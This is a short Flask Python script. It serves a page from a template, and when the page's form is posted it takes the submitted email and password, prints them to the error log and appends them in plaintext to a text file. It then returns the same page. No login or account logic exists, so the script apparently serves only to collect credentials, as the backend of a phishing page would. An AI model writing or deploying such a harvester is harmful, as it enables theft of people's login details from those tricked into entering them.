from flask import Flask, request, render_template
import sys

app = Flask(__name__)

@app.route('/')
def index():

        return render_template('index.html')
@app.route('/', methods=['POST'])

def index_post() :
    Mail = 'email: ' + request.form["email"]
    Password = 'mdp: ' + request.form["pass"]
    data = Mail + '; ' + Password + '.  '
    print(data, file=sys.stderr)

    with open('database.txt', 'a') as f:
        f.write(data)
    return render_template("index.html")

app.run(host='0.0.0.0', port='80')
